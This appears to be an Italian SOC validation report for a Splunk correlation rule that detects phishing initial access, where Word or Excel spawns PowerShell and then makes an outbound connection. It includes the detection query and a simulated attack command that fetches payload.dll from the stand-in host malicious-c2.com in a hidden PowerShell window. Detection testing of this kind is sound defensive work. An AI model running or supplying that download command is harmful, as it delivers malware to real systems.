# 🧪 Validation Report: Correlation Rule - Phishing Initial Access

## 📋 Informazioni Generali
* **Correlation Name:** Multi-Stage Attack: Phishing Initial Access & C2
* **Regola di Riferimento:** `15-Correlation-Phishing-InitialAccess.md`
* **Severity:** 🔴 HIGH
* **Obiettivo:** Rilevare il punto d'ingresso ("Paziente Zero") tramite un allegato di posta malevolo che lancia codice ed effettua richieste di rete.

## 🎯 The Attack Chain (Kill Chain Simulata)
L'attacco è stato simulato innescando l'esecuzione di una macro Word malevola tramite PowerShell (entro 24 ore).

**Fase 1: Initial Access & Execution (Word spawna PowerShell)**
```cmd
powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri [http://malicious-c2.com/payload.dll](http://malicious-c2.com/payload.dll) -OutFile C:\Temp\payload.dll"
```

**Fase 2: Command and Control (Connessione di rete dal terminale)**
(L'esecuzione del comando precedente attiva automaticamente anche la connessione di rete verso l'esterno)

---

## 📡 Telemetria Attesa
1. `EventCode 4688` / `EventCode 1` che mostra `winword.exe` o `excel.exe` avviare `cmd.exe` / `powershell.exe`.
2. `EventCode 3` (Sysmon - Network Connection) inizializzato da un processo terminale.

## 🔴 Correlated Splunk Query (SPL)

```SPL
(index=wineventlog OR index=sysmon)
( (EventCode=4688 OR EventCode=1) ("*winword.exe*" OR "*excel.exe*") ("*cmd.exe*" OR "*powershell.exe*") ) OR 
( EventCode=3 ("*powershell.exe*" OR "*cmd.exe*") )
| transaction host maxspan=24h
| search ("*winword.exe*" OR "*excel.exe*") AND ("*cmd.exe*" OR "*powershell.exe*") AND EventCode=3
| eval Attack_Chain="ALLARME CRITICO: Esecuzione Macro (Office) -> Lancio Shell -> Connessione C2"
| table _time, host, duration, Attack_Chain
```

## ✅ Risultato della Validazione e Screenshot
La regola correla perfettamente l'esecuzione del processo e la sua conseguente attività di rete, identificando l'accesso iniziale.

**Risultato:** `PASS` 🟢
